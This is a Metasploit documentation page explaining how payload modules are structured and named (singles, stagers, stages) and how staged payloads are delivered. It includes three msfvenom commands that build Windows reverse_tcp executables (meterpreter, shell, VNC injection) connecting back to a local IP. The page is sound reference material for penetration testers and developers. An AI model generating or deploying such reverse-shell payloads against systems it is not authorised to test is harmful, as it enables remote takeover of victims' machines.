I"R<h1 id="how-payloads-work">How Payloads Work</h1>

<p>Payload modules are stored in <code class="highlighter-rouge">modules/payloads/{singles,stages,stagers}/&lt;platform&gt;</code>. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism.</p>

<p>Payloads are given reference names that indicate all the pieces, like so:</p>
<ul>
  <li>Staged payloads: <code class="highlighter-rouge">&lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</code></li>
  <li>Single payloads: <code class="highlighter-rouge">&lt;platform&gt;/[arch]/&lt;single&gt;</code></li>
</ul>

<p>This results in payloads like <code class="highlighter-rouge">windows/x64/meterpreter/reverse_tcp</code>. Breaking that down, the platform is <code class="highlighter-rouge">windows</code>, the architecture is <code class="highlighter-rouge">x64</code>, the final stage weâ€™re delivering is <code class="highlighter-rouge">meterpreter</code>, and the stager delivering it is <code class="highlighter-rouge">reverse_tcp</code>.</p>

<p>Note that architecture is optional because in some cases it is either unnecessary or implied. An example is <code class="highlighter-rouge">php/meterpreter/reverse_tcp</code>. Arch is unneeded for PHP payloads because weâ€™re delivering interpreted code rather than native.</p>

<h3 id="singles">Singles</h3>

<p>Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they donâ€™t have to. An example of a scenario where you might want a single is when the target has no network access â€“ a fileformat exploit delivered via USB key is still possible.</p>

<h3 id="stagers">Stagers</h3>

<p>Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code.</p>

<h3 id="stages">Stages</h3>

<p>Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C.</p>

<h2 id="delivering-stages">Delivering stages</h2>

<ol>
  <li>The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, youâ€™re really just creating the stager. So the following commands would create functionally identical exe files:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
 msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
 msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp
</code></pre></div>    </div>
    <p>(Note that these are <em>functionally</em> identical â€“ there is a lot of randomization that goes into it so no two executables are exactly the same.)</p>
  </li>
  <li>The Ruby side acts as a client using whichever transport mechanism was set up by the stager (e.g.: tcp, http, https).
    <ul>
      <li>In the case of a shell stage, Metasploit will connect the remote processâ€™s stdio to your terminal when you interact with it.</li>
      <li>In the case of a [[Meterpreter]] stage, Metasploit will begin speaking the Meterpreter wire protocol.</li>
    </ul>
  </li>
</ol>

:ET